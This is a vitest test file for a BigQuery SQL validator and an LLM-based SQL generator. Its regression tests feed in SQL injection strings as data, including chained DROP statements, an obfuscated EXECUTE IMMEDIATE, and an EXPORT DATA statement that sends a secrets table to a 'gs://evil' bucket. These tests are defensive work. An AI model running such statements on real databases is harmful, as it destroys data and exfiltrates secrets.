/**
 * Ported from dev-dashboard-v2 tests/sql-generator.test.ts.
 * vi.mock によるBigQuery/Claudeモックは注入フェイクに置き換え。
 */
import { describe, it, expect, vi } from "vitest";
import {
  validateSql,
  formatSchemaForPrompt,
  generateSql,
  discoverSchema,
  SQL_GENERATION_SYSTEM,
  DANGEROUS_KEYWORDS_RE,
  VALID_START_RE,
  LIMIT_RE,
  MAX_RESULT_LIMIT,
  type JsonGenerator,
  type SchemaQueryRunner,
} from "./index";

describe("validateSql", () => {
  it("accepts valid SELECT query", () => {
    const result = validateSql("SELECT * FROM users LIMIT 10");
    expect(result.valid).toBe(true);
  });

  it("accepts WITH (CTE) query", () => {
    const result = validateSql("WITH cte AS (SELECT 1) SELECT * FROM cte");
    expect(result.valid).toBe(true);
    expect(result.sanitizedSql).toContain("LIMIT 1000");
  });

  it("rejects DROP statement", () => {
    const result = validateSql("DROP TABLE users");
    expect(result.valid).toBe(false);
    expect(result.error).toBeDefined();
  });

  it("rejects INSERT statement", () => {
    const result = validateSql("INSERT INTO users VALUES (1)");
    expect(result.valid).toBe(false);
  });

  it("rejects DELETE statement", () => {
    const result = validateSql("DELETE FROM users");
    expect(result.valid).toBe(false);
  });

  it("rejects CREATE TABLE", () => {
    const result = validateSql("CREATE TABLE evil (id INT)");
    expect(result.valid).toBe(false);
  });

  it("rejects UPDATE statement", () => {
    const result = validateSql('UPDATE users SET name = "hacked"');
    expect(result.valid).toBe(false);
  });

  it("rejects TRUNCATE", () => {
    const result = validateSql("TRUNCATE TABLE users");
    expect(result.valid).toBe(false);
  });

  it("rejects dangerous keyword hidden inside a SELECT", () => {
    const result = validateSql("SELECT 1; DROP TABLE users");
    expect(result.valid).toBe(false);
    // Now caught earlier by the multi-statement guard; either message is a reject.
    expect(result.error).toBeDefined();
  });

  // ─── Regression: multi-statement injection bypasses (security audit) ─────────
  // Previously these passed validation because the SELECT prefix satisfied the
  // start check and the second statement's keyword was not in the blocklist
  // (CALL / EXECUTE / EXPORT / LOAD) or could be obfuscated.
  it("rejects CALL of a mutating stored procedure after a SELECT", () => {
    const result = validateSql("SELECT 1; CALL myproject.myset.wipe_all()");
    expect(result.valid).toBe(false);
  });

  it("rejects EXECUTE IMMEDIATE with an obfuscated (CONCAT'd) DROP", () => {
    const result = validateSql("SELECT 1; EXECUTE IMMEDIATE CONCAT('DR','OP TABLE t')");
    expect(result.valid).toBe(false);
  });

  it("rejects EXPORT DATA exfiltration after a SELECT", () => {
    const result = validateSql(
      "SELECT 1; EXPORT DATA OPTIONS(uri='gs://evil') AS SELECT * FROM secrets",
    );
    expect(result.valid).toBe(false);
  });

  it("rejects a mutating second statement chained after a WITH/CTE query", () => {
    const result = validateSql("WITH x AS (SELECT 1) SELECT * FROM x; CALL evil()");
    expect(result.valid).toBe(false);
  });

  it("rejects standalone CALL / EXECUTE / EXPORT / LOAD keywords", () => {
    for (const q of [
      "CALL proc()",
      "EXECUTE IMMEDIATE 'x'",
      "EXPORT DATA OPTIONS() AS SELECT 1",
      "LOAD DATA INTO t",
    ]) {
      expect(validateSql(q).valid).toBe(false);
    }
  });

  it("adds LIMIT 1000 when missing", () => {
    const result = validateSql("SELECT * FROM users");
    expect(result.valid).toBe(true);
    expect(result.sanitizedSql).toMatch(/LIMIT 1000$/i);
  });

  it("preserves existing LIMIT", () => {
    const result = validateSql("SELECT * FROM users LIMIT 50");
    expect(result.valid).toBe(true);
    expect(result.sanitizedSql).not.toMatch(/LIMIT 1000/);
  });

  it("strips trailing semicolon and appends LIMIT when missing", () => {
    const result = validateSql("SELECT * FROM users;");
    expect(result.valid).toBe(true);
    expect(result.sanitizedSql).toBe(`SELECT * FROM users\nLIMIT ${MAX_RESULT_LIMIT}`);
  });

  it("strips trailing semicolon and keeps existing LIMIT", () => {
    const result = validateSql("SELECT * FROM users LIMIT 5;");
    expect(result.valid).toBe(true);
    expect(result.sanitizedSql).toBe("SELECT * FROM users LIMIT 5");
  });

  it("rejects empty query", () => {
    const result = validateSql("");
    expect(result.valid).toBe(false);
  });

  it("rejects non-SELECT/WITH start", () => {
    const result = validateSql("GRANT ALL ON users TO public");
    expect(result.valid).toBe(false);
  });
});

describe("exported safety regexes", () => {
  it("DANGEROUS_KEYWORDS_RE matches DDL/DML case-insensitively", () => {
    expect(DANGEROUS_KEYWORDS_RE.test("merge into t")).toBe(true);
    expect(DANGEROUS_KEYWORDS_RE.test("revoke all")).toBe(true);
    expect(DANGEROUS_KEYWORDS_RE.test("select updated_at from t")).toBe(false); // word boundary
  });

  it("VALID_START_RE only accepts SELECT/WITH starts", () => {
    expect(VALID_START_RE.test("  select 1")).toBe(true);
    expect(VALID_START_RE.test("WITH x AS (SELECT 1) SELECT 1")).toBe(true);
    expect(VALID_START_RE.test("EXPLAIN SELECT 1")).toBe(false);
  });

  it("LIMIT_RE requires a numeric limit", () => {
    expect(LIMIT_RE.test("SELECT 1 LIMIT 10")).toBe(true);
    expect(LIMIT_RE.test("SELECT 1")).toBe(false);
  });
});

describe("formatSchemaForPrompt", () => {
  it("formats schema into readable text", () => {
    const schemas = [
      { tableName: "users", columns: [{ name: "id", type: "INT64" }, { name: "name", type: "STRING" }] },
    ];
    const text = formatSchemaForPrompt(schemas);
    expect(text).toContain("users");
    expect(text).toContain("id");
    expect(text).toContain("INT64");
  });

  it("handles empty schema", () => {
    const text = formatSchemaForPrompt([]);
    expect(typeof text).toBe("string");
    expect(text).toBe("No tables found.");
  });
});

describe("generateSql", () => {
  it("calls the injected generator with system prompt, question and schema", async () => {
    const schemas = [{ tableName: "users", columns: [{ name: "id", type: "INT64" }] }];
    const generator = vi.fn(async () => ({ sql: "SELECT COUNT(*) FROM users", explanation: "Counts users" })) as unknown as JsonGenerator;

    const result = await generateSql(generator, "How many users?", schemas);
    expect(result.sql).toBe("SELECT COUNT(*) FROM users");
    expect(result.explanation).toBe("Counts users");
    expect(generator).toHaveBeenCalledOnce();

    const [system, userPrompt, fallback, options] = (generator as unknown as ReturnType<typeof vi.fn>).mock.calls[0]!;
    expect(system).toBe(SQL_GENERATION_SYSTEM);
    expect(userPrompt).toContain("## Database Schema");
    expect(userPrompt).toContain("How many users?");
    expect(fallback).toEqual({ sql: "", explanation: "" });
    expect(options).toEqual({ maxTokens: 2000 });
  });

  it("includes project context when provided", async () => {
    const generator = vi.fn(async () => ({ sql: "SELECT 1", explanation: "x" })) as unknown as JsonGenerator;
    await generateSql(generator, "q", [], "売上はJPYで記録");
    const [, userPrompt] = (generator as unknown as ReturnType<typeof vi.fn>).mock.calls[0]!;
    expect(userPrompt).toContain("## Additional Context");
    expect(userPrompt).toContain("売上はJPYで記録");
  });

  it("returns fallback on API failure (generator contract)", async () => {
    const generator: JsonGenerator = async <T,>(_s: string, _u: string, fallback: T) => fallback;
    const result = await generateSql(generator, "test", []);
    expect(result.sql).toBe("");
    expect(result.explanation).toBe("");
  });
});

describe("discoverSchema", () => {
  const rows = [
    { table_name: "users", column_name: "id", data_type: "INT64" },
    { table_name: "users", column_name: "name", data_type: "STRING" },
    { table_name: "orders", column_name: "id", data_type: "INT64" },
  ];

  it("queries INFORMATION_SCHEMA and groups by table", async () => {
    const runQuery = vi.fn(async (_sql: string) => ({ rows }));
    const schemas = await discoverSchema(runQuery, "proj", "my_dataset");

    expect(schemas.length).toBe(2);
    expect(schemas[0]!.tableName).toBe("users");
    expect(schemas[0]!.columns).toEqual([
      { name: "id", type: "INT64" },
      { name: "name", type: "STRING" },
    ]);
    expect(schemas[1]!.tableName).toBe("orders");

    const sql = runQuery.mock.calls[0]![0] as unknown as string;
    expect(sql).toContain("`proj.my_dataset.INFORMATION_SCHEMA.COLUMNS`");
    expect(sql).toContain("ORDER BY table_name, ordinal_position");
  });

  it("skips rows missing table or column names", async () => {
    const runQuery: SchemaQueryRunner = async () => ({
      rows: [{ table_name: "", column_name: "id", data_type: "INT64" }, ...rows.slice(0, 1)],
    });
    const schemas = await discoverSchema(runQuery, "proj", "ds");
    expect(schemas).toEqual([{ tableName: "users", columns: [{ name: "id", type: "INT64" }] }]);
  });

  it("returns [] when the runner throws", async () => {
    const errSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    const runQuery: SchemaQueryRunner = async () => {
      throw new Error("permission denied");
    };
    const schemas = await discoverSchema(runQuery, "proj", "ds");
    expect(schemas).toEqual([]);
    errSpy.mockRestore();
  });
});
